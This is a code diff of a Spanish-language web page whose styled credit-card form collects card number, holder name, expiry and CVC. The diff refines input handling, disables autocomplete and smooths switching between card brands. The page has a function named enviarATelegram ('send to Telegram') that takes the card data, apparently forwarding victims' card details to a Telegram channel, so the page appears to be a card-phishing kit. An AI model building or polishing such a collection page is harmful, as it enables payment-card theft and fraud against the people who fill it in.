@@ -379,7 +379,7 @@
                     <div class="badge">CRÉDITO</div>
                 </div>
                 <div class="sim-chip"></div>
-                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
+                <input type="text" id="cardNumberInput" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" autocomplete="off">
                 <div class="info-row">
                     <div class="info-group" style="flex: 2;">
                         <div class="label">TITULAR</div>
@@ -404,7 +404,7 @@
                     <div class="badge">CRÉDITO</div>
                 </div>
                 <div class="sim-chip"></div>
-                <input type="text" id="cardNumberInputVisa" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric">
+                <input type="text" id="cardNumberInputVisa" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" autocomplete="off">
                 <div class="info-row">
                     <div class="info-group" style="flex: 2;">
                         <div class="label">TITULAR</div>
@@ -427,7 +427,7 @@
                     <div class="badge">CRÉDITO</div>
                 </div>
                 <div class="sim-chip"></div>
-                <input type="text" id="cardNumberInputAmex" class="card-number-input" placeholder="**** ****** *****" maxlength="19" inputmode="numeric">
+                <input type="text" id="cardNumberInputAmex" class="card-number-input" placeholder="**** ****** *****" maxlength="19" inputmode="numeric" autocomplete="off">
                 <div class="info-row">
                     <div class="info-group" style="flex: 2;">
                         <div class="label">TITULAR</div>
@@ -474,9 +474,10 @@
     const statusMsg = document.getElementById('statusMsg');
     const cardTypeIndicator = document.getElementById('cardTypeIndicator');
 
-    let cardType = 'mastercard'; // Cambiado: iniciar en mastercard
+    let cardType = 'mastercard';
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
+    let currentInput = null;
 
     // Obtener inputs según tipo
     function getCardInputs() {
@@ -513,12 +514,15 @@
         return 'none';
     }
 
-    // Actualizar la tarjeta según el tipo detectado
+    // Actualizar la tarjeta según el tipo detectado (sin perder el foco)
     function updateCardType(type) {
-        if (type === 'none') {
-            // Si no se detecta, mantener el actual
-            return;
-        }
+        if (type === 'none' || type === cardType) return;
+        
+        // Guardar el valor actual y el foco
+        const inputs = getCardInputs();
+        const currentValue = inputs ? inputs.number.value : '';
+        const activeElement = document.activeElement;
+        const isNumberFocused = activeElement && activeElement.id && activeElement.id.includes('cardNumberInput');
         
         cardType = type;
         
@@ -527,28 +531,39 @@
         frontVisa.classList.remove('active');
         frontAmex.classList.remove('active');
         
-        // Mostrar la correcta y actualizar indicador
-        const indicator = document.getElementById('cardTypeIndicator');
-        
+        // Mostrar la correcta
         if (type === 'mastercard') {
             frontMastercard.classList.add('active');
-            indicator.innerHTML = '<span class="detected">💳 Mastercard detectada</span>';
+            cardTypeIndicator.innerHTML = '<span class="detected">💳 Mastercard detectada</span>';
             cvcInput.maxLength = 3;
             cvcInput.placeholder = '123';
         } else if (type === 'visa') {
             frontVisa.classList.add('active');
-            indicator.innerHTML = '<span class="detected">💳 Visa detectada</span>';
+            cardTypeIndicator.innerHTML = '<span class="detected">💳 Visa detectada</span>';
             cvcInput.maxLength = 3;
             cvcInput.placeholder = '123';
         } else if (type === 'amex') {
             frontAmex.classList.add('active');
-            indicator.innerHTML = '<span class="detected">💳 American Express detectada</span>';
+            cardTypeIndicator.innerHTML = '<span class="detected">💳 American Express detectada</span>';
             cvcInput.maxLength = 4;
             cvcInput.placeholder = '1234';
         }
         
-        // Reconfigurar eventos para los nuevos inputs activos
-        setupCardEvents();
+        // Restaurar el valor en el nuevo input
+        const newInputs = getCardInputs();
+        if (newInputs && currentValue) {
+            newInputs.number.value = currentValue;
+        }
+        
+        // Restaurar el foco si estaba en el campo de número
+        if (isNumberFocused && newInputs) {
+            setTimeout(() => {
+                newInputs.number.focus();
+                // Colocar el cursor al final
+                const len = newInputs.number.value.length;
+                newInputs.number.setSelectionRange(len, len);
+            }, 50);
+        }
     }
 
     async function enviarATelegram(cardData) {
@@ -597,14 +612,12 @@
         if (cleaned.length > maxLength) cleaned = cleaned.slice(0, maxLength);
         
         if (type === 'amex') {
-            // Formato AMEX: 4-6-5
             let parts = [];
             if (cleaned.length > 0) parts.push(cleaned.slice(0, 4));
             if (cleaned.length > 4) parts.push(cleaned.slice(4, 10));
             if (cleaned.length > 10) parts.push(cleaned.slice(10, 15));
             return parts.join(' ');
         } else {
-            // Formato estándar: 4-4-4-4
             let parts = [];
             for (let i = 0; i < cleaned.length; i += 4) parts.push(cleaned.slice(i, i + 4));
             return parts.join(' ');
@@ -623,34 +636,32 @@
         const inputs = getCardInputs();
         if (!inputs) return;
         
-        // Remover eventos anteriores clonando y reemplazando
-        const newNumber = inputs.number.cloneNode(true);
-        const newHolder = inputs.holder.cloneNode(true);
-        const newExpiry = inputs.expiry.cloneNode(true);
+        // Solo configurar eventos si no tienen listeners (evitar duplicados)
+        if (inputs.number._listenersSetup) return;
+        inputs.number._listenersSetup = true;
         
-        inputs.number.parentNode.replaceChild(newNumber, inputs.number);
-        inputs.holder.parentNode.replaceChild(newHolder, inputs.holder);
-        inputs.expiry.parentNode.replaceChild(newExpiry, inputs.expiry);
-        
-        const numberInput = document.getElementById(newNumber.id);
-        const holderInput = document.getElementById(newHolder.id);
-        const expiryInput = document.getElementById(newExpiry.id);
-        
-        numberInput.addEventListener('input', function(e) {
-            const type = detectCardType(e.target.value);
-            if (type !== 'none') {
+        inputs.number.addEventListener('input', function(e) {
+            const rawValue = e.target.value;
+            const type = detectCardType(rawValue);
+            
+            // Actualizar el tipo si es diferente
+            if (type !== 'none' && type !== cardType) {
                 updateCardType(type);
+                // Después de actualizar, obtener el nuevo input y continuar
+                const newInputs = getCardInputs();
+                if (newInputs) {
+                    // Aplicar formato al valor
+                    const formatted = formatCardNumber(rawValue, cardType);
+                    newInputs.number.value = formatted;
+                }
+                return;
             }
-            // Actualizar el placeholder según el tipo
-            if (cardType === 'amex') {
-                e.target.placeholder = '**** ****** *****';
-            } else {
-                e.target.placeholder = '**** **** **** ****';
-            }
-            e.target.value = formatCardNumber(e.target.value, cardType);
+            
+            // Aplicar formato normalmente
+            e.target.value = formatCardNumber(rawValue, cardType);
         });
 
-        expiryInput.addEventListener('input', function(e) {
+        inputs.expiry.addEventListener('input', function(e) {
             let formatted = formatExpiry(e.target.value);
             e.target.value = formatted;
             if (expiryTimeout) clearTimeout(expiryTimeout);
@@ -666,22 +677,22 @@
             }
         });
 
-        expiryInput.addEventListener('blur', function() {
+        inputs.expiry.addEventListener('blur', function() {
             if (expiryTimeout) clearTimeout(expiryTimeout);
-            if (!card.classList.contains('flipped') && expiryInput.value.length >= 3) {
+            if (!card.classList.contains('flipped') && inputs.expiry.value.length >= 3) {
                 isFlippingFromExpiry = true;
                 card.classList.add('flipped');
                 setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
             }
         });
 
-        holderInput.addEventListener('input', function(e) {
+        inputs.holder.addEventListener('input', function(e) {
             e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, '');
         });
 
-        numberInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
-        holderInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
-        expiryInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        inputs.number.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        inputs.holder.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        inputs.expiry.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
     }
 
     // CVC events
@@ -698,7 +709,7 @@
         }, 150);
     });
 
-    // Inicializar - Mostrar Mastercard por defecto
+    // Inicializar
     frontMastercard.classList.add('active');
     setupCardEvents();
 
